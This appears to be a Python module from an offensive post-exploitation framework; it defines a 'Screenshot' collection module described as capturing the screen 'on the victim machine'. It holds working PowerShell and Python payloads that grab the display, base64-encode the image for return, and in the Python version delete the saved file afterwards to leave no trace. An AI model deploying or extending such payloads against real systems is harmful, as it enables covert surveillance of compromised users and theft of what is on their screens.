import sys
import os
import pdb
import pathlib
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module


class Screenshot(Module):
    ## TODO call init of super??
    def __init__(self,name,utility,language):
        self.name = 'screenshot'
        self.description = 'This module takes a screenshot on the victim machine using the python mss module.'
        self.utility = 'collection'
        self.language = 'python'
        self.script = getattr(self,f"script_{language}")()
        
    def script_powershell(self):
        return """[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | out-null
        function screenshot([Drawing.Rectangle]$bounds) {

           ## Instead of saving
           $ms = New-Object System.IO.MemoryStream;
           
           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
           $graphics = [Drawing.Graphics]::FromImage($bmp)

           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)


           $graphics.Dispose()
           $bmp.save($ms, [Drawing.Imaging.ImageFormat]::Png);
           $bmp.Dispose()

           [convert]::ToBase64String($ms.ToArray());

        }

        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
        $bytes = screenshot $bounds

        return $bytes"""

    def script_python(self):
        return """def execute_command():
        from mss import mss
        import os
        import base64
        ## Take screenshot
        with mss() as sct:
            filename = sct.shot()

        image_path = os.path.join(os.getcwd(),filename)
        if os.path.isfile(image_path):
            content = open(image_path,"rb").read()
            enc_content = base64.b64encode(content)
            os.remove(image_path)
            return enc_content
        else:
            return False"""

